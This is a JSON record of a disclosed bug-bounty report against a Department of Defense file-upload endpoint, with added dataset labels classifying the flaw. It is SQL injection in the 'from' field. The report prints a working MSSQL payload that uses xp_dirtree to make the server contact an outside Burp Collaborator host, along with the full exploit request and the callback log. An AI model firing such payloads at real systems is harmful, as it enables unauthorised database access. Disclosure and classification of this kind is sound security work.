{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "lfb ",
  "title": " SQL injections",
  "content": "\nSummary:\nAn email is not well handeled and leads to sql injection.\nDescription:\nThis request\nPOST /FileTransfer/Upload HTTP/1.1\nHost: www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nThe parameter from is injectable and leads to valid sql injection.\n## Impact\nI didn't go all out and get a shell but, an attaker could exctract db information or execute sql command on the serve with the rights of the db user.\nStep-by-step Reproduction Instructions\nPayload injection\nCode 129 Bytes\n1';declare @q varchar(99);set @q='\\\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- \nRequest to make execute the sql command\nCode 827 Bytes\n1POST /FileTransfer/Upload HTTP/1.1\n2Host: www.\u2588\u2588\u2588\n3Connection: close\n4Content-Length: 269\n5Cache-Control: max-age=0\n6Origin: https://www.\u2588\u2588\u2588\u2588\n7Upgrade-Insecure-Requests: 1\n8Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybjrDo2DV1yHQWvAQ\n9User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36\n10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n11DNT: 1\n12Referer: https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/FileTransfer/\n13Accept-Language: en-GB,en-US;q=0.8,en;q=0.6,fr;q=0.4\n14\n15------WebKitFormBoundarybjrDo2DV1yHQWvAQ\n16Content-Disposition: form-data; name=\"from\"\n17\n18hello';declare @q varchar(99);set @q='\\\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- \n19------WebKitFormBoundarybjrDo2DV1yHQWvAQ\nfirst I get a dns query on my burp collaborator (see sqli2.png)\nsecond I get the server to poll with master.dbo.xp_dirtree from 143.85.74.18 at 2017-Sep-27 21:29:55\nCode 262 Bytes\n1PROPFIND /random HTTP/1.1\n2Host: 4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net\n3Content-Length: 0\n4Depth: 0\n5translate: f\n6User-Agent: Microsoft-WebDAV-MiniRedir/6.0.6002\n7Accept-Encoding: gzip, deflate, identity\n8Connection: Keep-Alive\n9X-BlueCoat-Via: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAlso it is easy to see that the single quote breaks the sql syntax.\nSuggested Mitigation/Remediation Actions\nMake prepared statement so the ' doesnt get interpreted. (Input data validation)\nMaybe verify other parameters.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1570216740,
  "report_url": "https://hackerone.com/reports/272506",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a POST request to /FileTransfer/Upload with a malicious SQL injection payload in the 'from' parameter"
    ],
    [
      2,
      "Observe the DNS query on Burp Collaborator indicating successful SQL injection"
    ]
  ],
  "vuln_description": "The vulnerability is a SQL injection in the 'from' parameter of a file upload endpoint, allowing an attacker to execute arbitrary SQL commands on the server database.",
  "reason": "The attack involves a straightforward SQL injection technique with no complex interactions or state manipulation required. The vulnerability is discovered through simple parameter tampering with a common SQL injection payload.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability involves manipulating input parameters to execute arbitrary SQL commands, which is a different class of vulnerability from authentication or authorization bypass (IDOR or AuthN/AuthZ Bypass). The described methodology focuses on testing authorization boundaries by swapping user sessions and resource IDs, not on input validation or SQL command execution.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The SQL injection vulnerability involves a parameter ('from') that is injectable with a simple payload (e.g., a single quote) that breaks SQL syntax, detectable via same-channel error responses. The methodology's 'simple payloads' step includes testing for SQLi via basic payloads like quotes, which would trigger visible errors. While the report's exploit uses out-of-band (OOB) techniques (Burp Collaborator), the vulnerability's presence could still be identified through same-channel error detection during the initial payload testing phase. The methodology does not require advanced OOB payloads to flag the parameter as vulnerable.",
    "is_simple_injection": true
  }
}